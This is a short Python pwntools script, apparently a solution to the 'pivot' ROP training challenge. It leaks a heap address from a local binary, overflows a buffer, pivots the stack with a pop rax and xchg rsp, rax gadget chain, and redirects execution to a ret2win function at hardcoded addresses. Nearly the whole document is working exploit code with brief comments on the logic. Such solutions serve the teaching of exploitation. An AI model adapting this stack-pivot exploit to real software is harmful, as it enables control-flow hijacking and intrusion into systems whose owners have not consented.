from pwn import process, ELF, ROP, packing, context
context.log_level = 'critical'

e = ELF("pivot")
p = process(e.path)

rop_addr = p.recvuntil("> ").split(b":")[1].split(b"\n")[0].lstrip().decode()
print("pivot @: " + rop_addr)

'''
pop rax; ret
xchg rsp, rax; ret

allows us to set the stack pointer to anything we want. 


exploit logic:

1) set stack pointer to 0x7ffff7be4f10 using xchg

---rop chain---
2) call foothold_function - this updates its entry in the .got.plt table
3) alter .got.plt address of .got.plt to be the address of the ret2win function in libpivot
'''

POP_RAX_RET = 0x4009bb
XCHG_RSP_RAX_RET = 0x4009bd

junk = b"A" * 40
addr_foothold = 0x7ffff7dc896a
addr_main = 0x400847
addr_write = 0x7ffff7cd7ee0
addr_ret2win = 0x7ffff7dc8a81
#input() #debug
p.send(packing.p64(addr_foothold) + packing.p64(addr_ret2win))   #we can just stack pivot and then call ret2win directly
p.recvuntil("> ")

pivot = [POP_RAX_RET, int(rop_addr, 16), XCHG_RSP_RAX_RET]
pivot_chain = b"".join([packing.p64(r) for r in pivot])
p.send(junk + pivot_chain)
data = p.recvall(timeout=3)
print(data.split(b"\n")[2])